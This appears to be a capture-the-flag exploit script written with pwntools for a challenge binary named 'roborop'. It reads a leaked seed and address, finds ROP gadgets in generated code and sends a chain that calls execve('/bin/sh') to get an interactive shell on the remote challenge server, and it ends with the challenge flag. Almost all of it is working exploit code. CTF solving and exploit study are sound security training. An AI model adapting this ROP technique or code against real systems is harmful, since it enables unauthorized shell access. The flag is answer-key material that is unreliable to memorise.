
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from capstone import *
from pwn import *
from tqdm import tqdm
import shlex
import subprocess

context.binary = elfexe = ELF('./roborop')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
set $BASE=0x555555554000
b *($BASE+0x1582)
command
    x/10gx $rsp
end
continue
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'roborop-1.play.hfsc.tf'
    remote_port = 1993
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

io.recvuntil(b'seed: ')
seed = int(io.recvline().decode().strip(), 16)
print(f"seed= {hex(seed)}")
io.recvuntil(b'addr: ')
gadget_page = int(io.recvline().decode().strip(), 16)
print(f"gadget_page= {hex(gadget_page)}")

# TOO SLOW!!!
# libc = CDLL("./libc.so.6")
# libc.srand(seed)
# CODE = b''
# print("Simulating rand()")
# # for i in range(0x1000):
# for i in tqdm(range(0x4000000)):
#     r = libc.rand()
#     CODE += p32(r)

subprocess.check_call(shlex.split(
    f'gdb -q --nh -x ./dummy.gdbscript --args ./dummy {seed}'
))
with open('code', 'rb') as f:
    CODE = f.read()
print(hexdump(CODE[:0x100]))


def find_gadget(gadget: str):
    pos = CODE.find(asm(gadget))
    if pos == -1:
        print(f"Could not find gadget: {gadget}")
        print(f"gadget hex dump      : {asm(gadget).hex()}")
        return -1
    else:
        return p64(gadget_page + pos)

def assert_gadget(gadget: str):
    pos = find_gadget(gadget)
    if pos == -1:
        exit(1)
    return pos


# Payload will be a ROP chain to `execve("/bin/sh");`
# Works even when RSI is NULL
payload  = b''
payload += assert_gadget('push rsp; pop rdi; ret')

found=False
for i in range(0x20, 0x100, 8):
    res = find_gadget(f'mov bl, {hex(i)}; ret')
    if res != -1:
        payload += res
        print(f"offset: {hex(i)}")
        found=True
        break
if not found:
    print("not found")
    exit(1)
payload += assert_gadget('add rdi, rbx; ret;') # Most difficult gadget to find as it is 4 bytes

payload += assert_gadget('mov  al, 0x3b ; ret;')
payload += assert_gadget('syscall')
payload += b'A' * (i-0x20) # padding
payload += b'/bin/sh\x00'
payload += p64(0x00)

io.sendline(payload)

io.interactive()
io.close()

exit(0)

# midnight{spR4Y_aNd_pR4Y}
